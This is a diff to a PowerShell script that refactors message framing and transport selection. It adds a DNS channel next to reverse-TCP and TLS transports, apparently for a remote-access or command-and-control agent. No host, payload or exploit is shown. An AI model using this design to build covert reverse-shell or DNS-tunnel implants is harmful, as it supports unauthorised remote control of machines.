@@ -31,37 +31,58 @@ function Message-Create {
 
 function Message-SendToTransport([PSObject] $msg, [PSObject] $transport) {
 	$len = [System.Net.IPAddress]::HostToNetworkOrder([Int32]$msg.leng)
-	$data = $msg.mtype -join '' #[char[]][BitConverter]::GetBytes([Char] ) -join ''
-	$data += [char[]][BitConverter]::GetBytes([Int32] $len) -join ''
-	$data += $msg.content
+	$data = New-Object byte[]($msg.leng+5)
+	$data[0] = [byte] $msg.mtype
+	$lendata = [BitConverter]::GetBytes([Int32] $len)
+	for ($i=0; $i -lt $lendata.Length; ++$i) {
+	    $data[1+$i] = $lendata[$i]
+	}
+	$textdata = [System.Text.Encoding]::UTF8.GetBytes($msg.content)
+	for ($i=0; $i -lt $textdata.Length; ++$i) {
+	    $data[5+$i] = $textdata[$i]
+	}
 
-    if ($CHANNELENCRYPTION -eq "NONE") {
-    	Transport-ReverseTcp-Send $transport $data
-    } elseif ($CHANNELENCRYPTION -eq "TLS") {
-        Transport-Tls-Send $transport $data
-    }
+    Send-ToTransport $transport $data
 }
 
 function Message-ParseFromTransport([PSObject] $transport) {
-    if ($CHANNELENCRYPTION -eq "NONE") {
-    	$buf = Transport-ReverseTcp-Receive $transport $MESSAGE_HEADER_LEN
-    } elseif ($CHANNELENCRYPTION -eq "TLS") {
-        $buf = Transport-Tls-Receive $transport $MESSAGE_HEADER_LEN
-    }
+    $buf = Receive-FromTransport $transport $MESSAGE_HEADER_LEN
     
 	$MType = [Byte] $buf[0]
 	$leng = [Int32][BitConverter]::ToInt32($buf, 1)
 	$leng = [System.Net.IPAddress]::NetworkToHostOrder([Int32]$leng)
 
-    if ($CHANNELENCRYPTION -eq "NONE") {
-    	$Content = Transport-ReverseTcp-Receive $transport $leng
-    } elseif ($CHANNELENCRYPTION -eq "TLS") {
-        $Content = Transport-Tls-Receive $transport $leng
-    }
+    $Content = Receive-FromTransport $transport $leng
+    $Content = [System.Text.Encoding]::UTF8.GetString($Content)
 	
     return New-Object -TypeName PSObject -Property @{
        'mtype' = $MType
        'leng' = $leng
        'content' = $Content
     }
+}
+
+function Send-ToTransport([PSObject] $transport, $data) {
+    if ($CHANNELENCRYPTION -eq "NONE") {
+        if ($CONNECTIONMETHOD -eq "REVERSETCP") {
+            $buf = Transport-ReverseTcp-Send $transport $data
+        } elseif ($CONNECTIONMETHOD -eq "DNS") {
+            $buf = Transport-Dns-Send $transport $data
+        }
+    } elseif ($CHANNELENCRYPTION -eq "TLS") {
+        $buf = Transport-Tls-Send $transport $data
+    }
+}
+
+function Receive-FromTransport([PSObject] $transport, [Int32] $leng) {
+    if ($CHANNELENCRYPTION -eq "NONE") {
+        if ($CONNECTIONMETHOD -eq "REVERSETCP") {
+            $buf = Transport-ReverseTcp-Receive $transport $leng
+        } elseif ($CONNECTIONMETHOD -eq "DNS") {
+            $buf = Transport-Dns-Receive $transport $leng
+        }
+    } elseif ($CHANNELENCRYPTION -eq "TLS") {
+        $buf = Transport-Tls-Receive $transport $leng
+    }
+    return $buf
 }
